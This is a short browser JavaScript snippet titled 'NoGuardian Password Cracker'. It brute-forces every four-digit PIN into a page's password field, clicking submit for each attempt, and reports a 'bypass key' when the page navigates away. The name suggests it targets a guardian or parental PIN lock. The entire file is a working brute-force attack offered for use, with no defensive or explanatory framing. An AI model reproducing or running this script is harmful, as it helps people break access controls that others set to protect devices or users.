(function () {
  let i = 0;
  alert(
    `NoGuardian Password Cracker || tb-1.2\nSTARTING INDEX: ${i}\nPOSSIBLE COMBINATIONS: 10,000\nESTIMATED TIME: 1 minute\nINPUT VALUE: ${
      document.querySelector("input[type='password']").value
    }\nBUTTON VALUE: ${document.querySelector("button").value}`
  );
  function submitNumber() {
    if (i === 9999) {
      alert("NoGuardian Password Cracker could not find the bypass key.");
    }
    let num = ("000" + i).slice(-4);
    console.log(num);
    document.querySelector("input[type='password']").value = num;
    document.querySelector("button").click();
    i++;
    setTimeout(submitNumber, 1);
  }
  submitNumber();
  window.onbeforeunload = function () {
    document.body.innerHTML = `<p>Bypass key found! (${i})\nIf it doesn't work, try combinations numerically close to this number.</p>`;
    event.preventDefault();
  };
})();
